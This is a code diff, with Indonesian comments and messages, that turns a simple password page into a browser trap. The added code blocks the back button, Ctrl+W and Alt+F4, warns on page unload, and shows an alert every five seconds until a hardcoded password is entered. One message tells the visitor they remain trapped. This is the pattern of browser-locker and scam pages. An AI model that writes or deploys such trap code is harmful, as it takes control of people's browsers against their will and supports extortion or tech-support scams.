@@ -31,15 +31,15 @@
 
         function checkPassword() {
             let password = document.getElementById("password").value;
-            if (password.trim() !== "") {
+            if (password === "u8n2ac") {
                 passwordEntered = true;
-                alert("Password berhasil dimasukkan, Anda sekarang bisa kembali.");
+                alert("Password benar! Anda sekarang bisa keluar.");
             } else {
-                alert("Masukkan password terlebih dahulu!");
+                alert("Password salah! Anda tetap terjebak di sini.");
             }
         }
 
-        // Mencegah tombol kembali di browser sebelum password dimasukkan
+        // Cegah tombol kembali di browser
         function preventBackNavigation() {
             history.pushState(null, null, location.href);
             window.onpopstate = function () {
@@ -50,15 +50,35 @@
             };
         }
 
-        // Mencegah pengguna menutup tab atau meninggalkan halaman sebelum memasukkan password
+        // Cegah user menutup tab atau keluar sebelum memasukkan password
         window.onbeforeunload = function(event) {
             if (!passwordEntered) {
-                return "Anda harus memasukkan password terlebih dahulu sebelum keluar.";
+                return "Anda harus memasukkan password terlebih dahulu sebelum keluar!";
             }
         };
 
-        // Jalankan fungsi pencegahan back button
+        // Deteksi dan cegah kombinasi tombol tertentu (CTRL+W, ALT+F4, dsb.)
+        document.addEventListener("keydown", function (event) {
+            if (!passwordEntered) {
+                if (event.ctrlKey && event.key === "w") { // Cegah CTRL+W
+                    event.preventDefault();
+                    alert("Tidak bisa menutup tab sebelum memasukkan password!");
+                }
+                if (event.altKey && event.key === "F4") { // Cegah ALT+F4
+                    event.preventDefault();
+                    alert("Tidak bisa keluar sebelum memasukkan password!");
+                }
+            }
+        });
+
+        // Spam pop-up kalau user coba keluar paksa
+        setInterval(function () {
+            if (!passwordEntered) {
+                alert("Masukkan password dulu kalau mau keluar!");
+            }
+        }, 5000); // Setiap 5 detik pop-up muncul
+
         preventBackNavigation();
     </script>
 </body>
-</html>
+</html> 
